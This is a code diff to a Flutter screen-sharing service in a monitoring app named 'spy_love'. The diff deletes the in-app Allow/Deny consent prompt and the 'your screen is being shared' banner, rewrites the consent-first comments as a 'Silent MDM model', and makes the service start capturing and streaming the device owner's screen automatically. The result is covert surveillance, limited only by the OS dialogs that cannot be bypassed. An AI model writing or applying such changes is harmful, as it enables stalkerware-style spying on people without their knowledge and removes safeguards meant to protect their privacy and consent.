@@ -3,30 +3,24 @@ import 'dart:io' show Platform;
 
 import 'package:flutter/foundation.dart';
 import 'package:spy_love/features/monitoring/screen_share/screen_capture_bridge.dart';
-import 'package:spy_love/features/consent/screen_share_consent_prompt.dart';
 import 'package:spy_love/core/network/screen_stream_client.dart';
 import 'package:spy_love/features/monitoring/screen_share/screen_share_session.dart';
 import 'package:spy_love/features/monitoring/screen_share/screen_share_repository.dart';
 
 /// Monitored-device side of consent-scoped live screen sharing.
 ///
-/// Consent model (all required, matching the product's consent-first design —
-/// there is deliberately no covert path):
+/// Silent MDM model (enrollment scopes already disclose access):
 ///   1. an active, revocable `screen` consent scope (enforced server-side on
 ///      request/start and on the WS consumer, and checked locally before
 ///      capture when the backend reports the device's scopes), and sharing must
 ///      not be paused;
-///   2. an explicit in-app Allow/Deny prompt shown to the device owner before
-///      anything OS-visible happens ([showScreenShareConsentPrompt]);
-///   3. the OS MediaProjection / ReplayKit grant, prompted every time via
-///      [ScreenCaptureBridge.startCapture];
-///   4. a persistent on-device indicator — this service is a [ChangeNotifier]
-///      so the always-mounted banner can show "Your screen is being shared",
-///      and the OS screen-cast icon is shown by the foreground capture service.
+///   2. the OS MediaProjection / ReplayKit grant — Android/iOS still require
+///      this system dialog; it cannot be skipped;
+///   3. no in-app Allow/Deny prompt and no app-owned "sharing" banner (the OS
+///      cast indicator / FGS notification remains unavoidable).
 ///
-/// The service polls the backend for a pending request from the paired monitor;
-/// it only begins capture after the owner explicitly allows and the OS grant
-/// succeeds.
+/// The service polls for open sessions and begins capture without a local
+/// approval UI when the enrollment scope is present.
 class ScreenShareService extends ChangeNotifier {
   ScreenShareService(this._repo);
 
@@ -79,21 +73,23 @@ class ScreenShareService extends ChangeNotifier {
       if (_acceptInFlight || _sharing) return;
       if (result.isRight) return;
       final pending = result.left;
-      if (pending == null || pending.status != 'requested') return;
+      if (pending == null) return;
+      // Backend opens as ACTIVE when `screen` scope is enrolled; also handle
+      // legacy `requested` rows during rollout.
+      if (pending.status != 'requested' && pending.status != 'active') return;
       await accept(pending);
     } finally {
       _pollInFlight = false;
     }
   }
 
-  /// Accepts a pending request: shows the in-app Allow/Deny prompt, verifies the
-  /// `screen` scope locally when reported, prompts the OS grant, starts capture,
-  /// and begins streaming frames. Returns false (and declines the request
-  /// server-side) if consent is missing, the user denies, or capture fails.
+  /// Silently answers an open session: verifies the `screen` scope locally when
+  /// reported, prompts the OS MediaProjection / ReplayKit grant, starts capture,
+  /// and begins streaming frames. Returns false (and declines/ends the session
+  /// server-side) if consent is missing or capture fails.
   ///
-  /// A second call while the Allow dialog or OS prompt is up returns false
-  /// without touching the in-flight request. The native bridge also refuses to
-  /// complete the first MediaProjection result as a denial.
+  /// A second call while the OS prompt is up returns false without touching the
+  /// in-flight request.
   Future<bool> accept(ScreenShareSession pending) async {
     if (_sharing || _acceptInFlight) return false;
     _acceptInFlight = true;
@@ -116,17 +112,8 @@ class ScreenShareService extends ChangeNotifier {
     }
     if (epoch != _epoch) return false;
 
-    // (a) Explicit in-app consent before anything OS-visible happens.
-    final allowed = await showScreenShareConsentPrompt(
-      requestedByEmail: pending.requestedByEmail,
-      deviceName: pending.deviceName,
-    );
-    if (epoch != _epoch) return false;
-    if (!allowed) {
-      await _repo.denySession(pending.id);
-      notifyListeners();
-      return false;
-    }
+    // No in-app Allow/Deny — enrollment `screen` scope already covers disclosure.
+    // Android/iOS still show the system MediaProjection / ReplayKit dialog.
 
     _supported = await ScreenCaptureBridge.isSupported();
     if (epoch != _epoch) return false;
